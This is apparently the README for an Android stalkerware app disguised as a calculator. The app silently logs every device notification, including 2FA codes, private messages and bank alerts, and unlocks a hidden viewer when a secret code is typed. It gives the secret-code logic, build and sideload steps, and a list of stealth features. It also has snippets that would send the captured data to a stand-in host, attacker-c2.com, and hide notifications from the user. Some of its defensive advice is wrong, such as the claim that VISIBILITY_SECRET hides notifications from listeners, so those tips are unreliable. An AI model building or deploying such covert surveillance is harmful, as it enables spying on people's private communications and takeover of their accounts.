# Stealth Calculator — Hidden Notification Listener

> **DISCLAIMER:** This application is for cybersecurity research and educational purposes only. It demonstrates how malicious applications disguise dangerous functionality behind a benign UI. Use only on devices you own for security testing.

---

## Overview

This Android application presents itself as a simple, modern calculator (modeled after the iPhone calculator). However, behind the scenes, it:

1. **Listens to all notifications** on the device via `NotificationListenerService`
2. **Captures sensitive data** (titles, content, sender app names, timestamps)
3. **Stores captured notifications** in a local SQLite database
4. **Conceals the spy functionality** until a secret code is entered

**Secret Code:** `231199` (6-digit sequence) → Opens the hidden **Notification History** page

---

## Security Research Value

This app demonstrates:

| Threat | How It Works |
|--------|------------|
| **UI Obfuscation** | Innocent calculator UI hides malicious notification snooping |
| **Code Activation** | Secret code triggered through normal UI interaction |
| **Passive Persistence** | Background service runs silently while user works normally |
| **Silent Data Harvesting** | Notifications captured without any visible indication |
| **Local Exfiltration** | Database stores sensitive data for later exfiltration |

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│  PRESENTATION LAYER                                │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Main Activity                NotificationHistory  │
│  ┌─────────────────────────────────────────────┐   │
│  │ CalculatorScreen (Compose)                  │   │
│  │ - Modern iPhone-style UI                    │   │
│  │ - Fully functional calculator               │   │
│  │ - Secret code (231199) detection            │   │
│  └─────────────────────────────────────────────┘   │
│           ↓ [secret code entered]                  │
│  ┌─────────────────────────────────────────────┐   │
│  │ NotificationListScreen (Compose)            │   │
│  │ - Shows all captured notifications          │   │
│  │ - Real-time updates                         │   │
│  │ - Clear all function                        │   │
│  └─────────────────────────────────────────────┘   │
│                                                     │
├─────────────────────────────────────────────────────┤
│  BUSINESS LOGIC                                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  CalculatorViewModel        NotificationViewModel  │
│  - Calculator logic         - Notification UI state│
│  - Secret code detection    - Clear function      │
│  - Model formatting                               │
│                                                     │
├─────────────────────────────────────────────────────┤
│  DATA LAYER                                        │
├─────────────────────────────────────────────────────┤
│                                                     │
│  NotificationRepository                            │
│  ↓                                                  │
│  Room Database (SQLite)                            │
│  - Schema: captured_notifications                  │
│  - Fields: id, packageName, appName, title,        │
│            content, timestamp                      │
│                                                     │
├─────────────────────────────────────────────────────┤
│  SERVICE LAYER                                     │
├─────────────────────────────────────────────────────┤
│                                                     │
│  NotificationCaptureService                        │
│  - Intercepts all system notifications             │
│  - Writes to Room database asynchronously          │
│  - Logs structured data to Logcat                  │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## File Structure

```
app/src/main/
├── AndroidManifest.xml
├── java/com/putra/notificationlisteners/
│   ├── MainActivity.kt                    # Calculator entry point
│   ├── NotificationApp.kt                 # Application class
│   ├── data/
│   │   ├── db/
│   │   │   ├── NotificationEntity.kt      # Room @Entity
│   │   │   ├── NotificationDao.kt         # Room @Dao
│   │   │   └── AppDatabase.kt             # Room @Database
│   │   └── repository/
│   │       └── NotificationRepository.kt  # Repository pattern
│   ├── service/
│   │   └── NotificationCaptureService.kt  # Background listener
│   ├── viewmodel/
│   │   ├── CalculatorViewModel.kt         # NEW: Calculator logic + secret code
│   │   └── NotificationViewModel.kt       # Notification list logic
│   └── ui/
│       ├── activity/
│       │   └── NotificationHistoryActivity.kt  # NEW: Hidden activity
│       ├── components/
│       │   └── NotificationCard.kt
│       ├── screens/
│       │   ├── CalculatorScreen.kt        # NEW: Modern calculator UI
│       │   └── NotificationListScreen.kt  # Notification list UI
│       └── theme/
│           ├── Color.kt
│           ├── Theme.kt
│           └── Type.kt
```

---

## Calculator Implementation

### CalculatorViewModel Features

**Source:** [CalculatorViewModel.kt](app/src/main/java/com/putra/notificationlisteners/viewmodel/CalculatorViewModel.kt)

```kotlin
class CalculatorViewModel : ViewModel() {
    // Calculate arithmetic operations
    fun onNumberClick(num: String)
    fun onOperator(op: String)      // +, -, ×, ÷
    fun onEquals()
    fun onDecimal()
    fun onClear()
    
    // Secret code tracking
    private fun trackSecretCode(input: String)
    // When user enters "231199", triggers navigation
}
```

**Operations Supported:**
- ➕ Addition
- ➖ Subtraction
- ✖️ Multiplication
- ➗ Division
- 🔹 Decimal numbers
- 🔄 Continuous operations
- 🗑️ Clear all

**Calculation Examples:**
```
15 + 7 = 22
100 - 25 = 75
6 × 7 = 42
144 ÷ 12 = 12
3.14 × 2 = 6.28
```

---

### CalculatorScreen UI

**Source:** [CalculatorScreen.kt](app/src/main/java/com/putra/notificationlisteners/ui/screens/CalculatorScreen.kt)

**Design Inspiration:** iPhone Calculator

**Color Scheme (Dark Theme):**
- Background: `#1C1C1C` (very dark gray)
- Number buttons: `#383838` (medium-dark gray)
- Operator buttons: `#FF9500` (orange)
- Equals button: `#50C878` (green)
- Text: White

**Layout:**
```
┌─────────────────────────────────────┐
│            Display (60sp)           │
│        Result / Input Number        │
├─────────────────────────────────────┤
│  C   |  +/- |  %   |  ÷            │
├─────────────────────────────────────┤
│  7   |  8   |  9   |  ×            │
├─────────────────────────────────────┤
│  4   |  5   |  6   |  -            │
├─────────────────────────────────────┤
│  1   |  2   |  3   |  +            │
├─────────────────────────────────────┤
│  0       (spans 2)  |  .  |  =     │
└─────────────────────────────────────┘
```

**Interactive Features:**
- ✨ Smooth button press animations (92% scale on press)
- 🔘 Circular buttons with elevation shadow
- 🎨 Color-coded button types
- 📱 Responsive layout for different screen sizes

---

## Secret Code Mechanism

### How It Works

The `trackSecretCode()` function in `CalculatorViewModel`:

```kotlin
private fun trackSecretCode(input: String) {
    if (input.length == 1 && input[0].isDigit()) {
        secretCodeBuffer.append(input)
        
        // Keep only last 6 digits
        if (secretCodeBuffer.length > 6) {
            secretCodeBuffer.deleteCharAt(0)
        }
        
        // Check if matches "231199"
        if (secretCodeBuffer.toString() == SECRET_CODE) {
            _secretCodeTriggered.value = true
            secretCodeBuffer.clear()
        }
    }
}
```

### Activation Steps

1. **Open Calculator app** → User sees normal calculator UI
2. **Type any calculation** (e.g., "1 + 1 = 2")
3. **Carefully enter digits** `2`, `3`, `1`, `1`, `9`, `9` in sequence
   - Can be typed while in any calculation state
   - Buffer tracks last 6 digits only
4. **Automatic transition**
   - When 6th digit (the second `9`) is pressed
   - `secretCodeTriggered` state becomes `true`
   - Main activity navigates to `NotificationHistoryActivity`
5. **Hidden page opens** with all captured notifications

### Detection Stealth Features

- ✅ **No visual feedback** when code is detected
- ✅ **Works during normal use** (no need to clear calculation)
- ✅ **Hidden buffer** (user doesn't know it's being tracked)
- ✅ **Single-use trigger** (auto-resets after activation)
- ✅ **No logs or indicators** visible to user

---

## Navigation Flow

```
┌─────────────────────────────────┐
│  App Launch                      │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│  MainActivity                    │
│  (CalculatorScreen - default)    │
│                                 │
│  User sees: Calculator UI       │
└────────────┬────────────────────┘
             │
        [User types]
        [231199]
             │
             ▼
┌─────────────────────────────────┐
│  onSecretCodeTriggered() fires   │
│  navigateToNotificationHistory() │
│  startActivity(Intent(...))      │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│  NotificationHistoryActivity     │
│  (NotificationListScreen)        │
│                                 │
│  Displays:                      │
│  - Captured notifications       │
│  - Permission status            │
│  - Clear all button             │
└─────────────────────────────────┘
```

---

## Installation & Testing

### Build

**Debug APK:**
```bash
./gradlew assembleDebug
# Output: app/build/outputs/apk/debug/app-debug.apk (54 MB)
```

**Release APK:**
```bash
./gradlew assembleRelease
# Output: app/build/outputs/apk/release/app-release.apk (39 MB)
```

### Installation

**Via ADB:**
```bash
adb install app/build/outputs/apk/debug/app-debug.apk
# or
adb install app/build/outputs/apk/release/app-release.apk
```

**Manual:**
Copy APK to device storage, open file manager, tap to install.

---

### First Run

1. **Open app** → See calculator UI
2. **Grant notification access**: Tap "Open Settings" (red banner appears when permission not granted)
3. **Navigate to Settings → Notification Access**
4. **Toggle ON** for "NotificationListeners"
5. **Confirm** the security warning
6. **Return to app**, tap "Refresh"
7. **Green banner** "Listener Active" should appear

### Testing Secret Code

1. **Tap any numbers** to do a calculation (e.g., "15 + 7 = 22")
2. **Slowly type:** `2`, then `3`, then `1`, then `1`, then `9`, then `9`
3. **After the 6th digit** → automatically navigate to hidden page
4. **See all captured notifications** from services like:
   - Messages (SMS, WhatsApp, Telegram)
   - Email (Gmail, Outlook)
   - Banking apps
   - Any app that sends notifications

---

## Real-Time Logging

Monitor captured notifications via ADB logcat:

```bash
adb logcat -s NotifCaptureService
```

Output example:
```
╔══════════════════════════════════════════
║ CAPTURED NOTIFICATION
╠══════════════════════════════════════════
║ App:     WhatsApp
║ Title:   John Doe
║ Content: Hey, are you coming to the meeting?
║ Time:    1741075123456
╚══════════════════════════════════════════
```

---

## Security Implications

### What Gets Captured

This stealth app can intercept:

| Category | Examples | Risk |
|----------|----------|------|
| **Credentials** | 2FA codes, password reset links | 🔴 Critical |
| **Messages** | SMS, chat app previews | 🔴 Critical |
| **Finance** | Transaction alerts, balance updates | 🔴 Critical |
| **Location** | Maps navigation, Uber pickup | 🟡 High |
| **Health** | Fitness updates, medical alerts | 🟡 High |
| **Social** | Friend requests, @ mentions | 🟢 Medium |

### Real Attack Scenarios

**Scenario 1: Account Takeover**
1. User receives 2FA code for email account
2. Attacker intercepts it via this app
3. Attacker gains email access
4. Attacker resets passwords for all connected accounts

**Scenario 2: Data Exfiltration**
Instead of local storage, malicious version would:
```kotlin
// NOT implemented in this demo
serviceScope.launch {
    val json = gson.toJson(capturedNotifications)
    httpClient.post("https://attacker-c2.com/data") {
        body = json
    }
}
```

**Scenario 3: Selective Blocking**
```kotlin
// NOT implemented in this demo
override fun onNotificationPosted(sbn: StatusBarNotification?) {
    // ... capture data ...
    
    // Also dismiss the notification from user's view
    cancelNotification(sbn.key)
    
    // User never knows!
}
```

---

## User Protection Measures

### For End Users

1. **Audit Notification Access:**
   ```
   Settings → Apps → Special app access → Notification access
   Review and remove untrusted apps
   ```

2. **Disable Notification Previews:**
   ```
   Settings → Notifications → Lock screen → Hide sensitive content
   ```

3. **App-Level Settings:**
   - WhatsApp: Disable message previews in settings
   - Gmail: Disable preview text
   - Banking: Always require PIN for sensitive features

4. **Install from Trusted Sources:**
   - Google Play Protect scans for notification listener abuse
   - Avoid sideloaded APKs from unknown sources

5. **Use Security Scanner:**
   - Malwarebytes Mobile
   - Lookout Security
   - Avast Mobile Security

### For Developers

1. **Avoid Sensitive Data in Notifications:**
   ```kotlin
   // ❌ DON'T DO THIS
   notificationBuilder.setContentText("Your code is 123456")
   
   // ✅ DO THIS
   notificationBuilder.setContentText("Verification code sent")
   // Show actual code only on app open
   ```

2. **Use Notification Visibility:**
   ```kotlin
   // Hide from notification listener
   notification.visibility = Notification.VISIBILITY_SECRET
   ```

3. **Use Channel Overrides:**
   ```kotlin
   // Create public notification channel for listeners
   val publicChannel = NotificationChannel(
       "public", "Public Notifications",
       NotificationManager.IMPORTANCE_HIGH
   )
   publicChannel.setShowBadge(false)
   ```

---

## Code Quality Standards

✅ **MVVM Architecture** - Separation of concerns
✅ **Kotlin Coroutines** - Async/background operations
✅ **Room Database** - Persistence with type safety
✅ **Jetpack Compose** - Modern, declarative UI
✅ **StateFlow** - Reactive data binding
✅ **Well-Commented** - Educational code with inline docs
✅ **Error Handling** - Try-catch for robustness
✅ **Type Safety** - Full Kotlin type system usage

---

## Android API Levels

- **Minimum SDK:** Android 10 (API 29)
- **Target SDK:** Android 16 (API 36)
- **Compile SDK:** Android 36 (API 36)

---

## Dependencies

| Library | Version | Purpose |
|---------|---------|---------|
| Kotlin | 2.0.21 | Language |
| Compose | 2024.09.00 | UI framework |
| Room | 2.6.1 | Local persistence |
| Lifecycle ViewModel | 2.6.1 | MVVM |
| Material 3 | 2024.09.00 | Design system |

---

## Educational Value

This project teaches:

1. **Malware Obfuscation** - How apps hide functionality
2. **Permission Abuse** - Misusing legitimate Android APIs
3. **Background Services** - Running code silently
4. **Data Exfiltration** - Capturing sensitive data
5. **Defense Mechanisms** - How to detect and prevent attacks
6. **Secure Development** - How to write secure apps

---

## License & Disclaimer

This code is provided for **educational and cybersecurity research** only.

**Authorized use only:**
- Security researchers analyzing threats
- Developers learning about malware techniques
- Defensive testing on your own devices
- Academic cybersecurity courses

**Unauthorized use is illegal.**

---

## References

- [Android NotificationListenerService Documentation](https://developer.android.com/reference/android/service/notification/NotificationListenerService)
- [Android Security & Privacy Guidelines](https://developer.android.com/privacy-and-security)
- [OWASP Mobile Security Testing Guide](https://github.com/OWASP/owasp-mastg)
- [Android Malware Analysis Reports](https://www.lookout.com/threat-intelligence)

---

## Questions & Support

For security research questions:
- Review inline code comments
- Check Android documentation
- Consult cybersecurity research papers
- Test in isolated lab environment

**Remember:** This tool is for understanding threats. Use responsibly. 🔒
